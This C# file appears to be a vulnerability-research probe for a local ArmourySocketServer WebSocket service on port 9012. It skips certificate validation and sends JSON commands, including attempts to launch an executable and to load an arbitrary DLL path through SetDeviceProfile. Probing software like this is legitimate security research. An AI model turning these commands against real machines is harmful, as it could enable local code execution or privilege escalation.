/*
 * ws_ac_probe.cs — WebSocket probe for ArmourySocketServer AC port 9012 (WSS/TLS)
 * Build: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -nologo -out:ws_ac_probe.exe ws_ac_probe.cs
 */
using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

class WsAcProbe {
    static SslStream ssl;

    static byte[] MakeFrame(string text) {
        var payload = Encoding.UTF8.GetBytes(text);
        var rng = new RNGCryptoServiceProvider();
        var mask = new byte[4]; rng.GetBytes(mask);
        var frame = new System.Collections.Generic.List<byte>();
        frame.Add(0x81); // FIN + text opcode
        int len = payload.Length;
        if (len < 126) frame.Add((byte)(0x80 | len));
        else { frame.Add(0x80 | 126); frame.Add((byte)(len >> 8)); frame.Add((byte)(len & 0xFF)); }
        frame.AddRange(mask);
        for (int i = 0; i < payload.Length; i++) frame.Add((byte)(payload[i] ^ mask[i % 4]));
        return frame.ToArray();
    }

    static string ReadFrame(int ms = 3000) {
        try {
            ssl.ReadTimeout = ms;
            var h = new byte[2]; ssl.Read(h, 0, 2);
            int op = h[0] & 0x0F;
            int len = h[1] & 0x7F;
            if (len == 126) { var x = new byte[2]; ssl.Read(x, 0, 2); len = (x[0] << 8) | x[1]; }
            else if (len == 127) { var x = new byte[8]; ssl.Read(x, 0, 8); /* simplified */ }
            if (op == 8) return "<CLOSE>";
            if (op == 9) { var pb = new byte[len]; ssl.Read(pb, 0, len); return "<PING>"; }
            var buf = new byte[len]; int got = 0;
            while (got < len) { int n = ssl.Read(buf, got, len - got); if (n <= 0) break; got += n; }
            return Encoding.UTF8.GetString(buf);
        } catch (Exception e) { return "<ERR:" + e.Message.Split('\n')[0] + ">"; }
    }

    static void SendCmd(string json) {
        Console.WriteLine("[SEND] " + json);
        var frame = MakeFrame(json);
        ssl.Write(frame, 0, frame.Length);
        ssl.Flush();
        Thread.Sleep(400);
        string resp = ReadFrame(2000);
        Console.WriteLine("[RECV] " + resp);
        string extra;
        while ((extra = ReadFrame(500)) != null && !extra.StartsWith("<ERR"))
            Console.WriteLine("[MORE] " + extra);
    }

    static void Main(string[] args) {
        var tcp = new TcpClient("127.0.0.1", 9012);
        ssl = new SslStream(tcp.GetStream(), false,
            (s, cert, chain, e) => true, null); // accept any cert
        ssl.AuthenticateAsClient("localhost");
        Console.WriteLine("[+] TLS established. Protocol: " + ssl.SslProtocol);

        // WebSocket handshake over TLS
        var rng = new RNGCryptoServiceProvider();
        var keyBytes = new byte[16]; rng.GetBytes(keyBytes);
        string key = Convert.ToBase64String(keyBytes);
        string req = "GET / HTTP/1.1\r\nHost: 127.0.0.1:9012\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n" +
                     "Sec-WebSocket-Key: " + key + "\r\nSec-WebSocket-Version: 13\r\n\r\n";
        var reqBytes = Encoding.ASCII.GetBytes(req);
        ssl.Write(reqBytes, 0, reqBytes.Length);
        ssl.Flush();

        ssl.ReadTimeout = 3000;
        var buf = new byte[4096];
        int n = ssl.Read(buf, 0, buf.Length);
        string resp101 = Encoding.ASCII.GetString(buf, 0, n);
        Console.WriteLine("[+] Handshake: " + resp101.Split('\r')[0]);
        if (!resp101.Contains("101")) { Console.WriteLine("Handshake failed!"); return; }

        Console.WriteLine("[+] WebSocket over TLS connected on port 9012");

        // Check for initial server message
        string init = ReadFrame(1000);
        if (init != null && !init.StartsWith("<ERR")) Console.WriteLine("[INIT] " + init);

        // Send commands
        string[] cmds = {
            "{\"command\":\"GetProductName\"}",
            "{\"command\":\"GetDeviceProfileList\"}",
            "{\"command\":\"GetMacroList\"}",
            "{\"command\":\"GetDeviceLightingControl\"}",
            "{\"command\":\"ScenarioProfileList\"}",
            "{\"command\":\"LaunchAuraCreator\"}",
            "{\"command\":\"MacroNew\",\"fileName\":\"test\",\"fileData\":\"test\"}",
            "{\"command\":\"Launch P303LocalUpdate.exe\"}",
            "{\"command\":\"SetDeviceProfile\",\"filepath\":\"C:\\\\ProgramData\\\\test.dll\"}",
            "{\"command\":\"GetScenarioProfileList\"}",
            "{\"command\":\"GetScenarioProfileData\"}",
        };

        foreach (var cmd in cmds) SendCmd(cmd);
        Console.WriteLine("[+] Done");
        tcp.Close();
    }
}
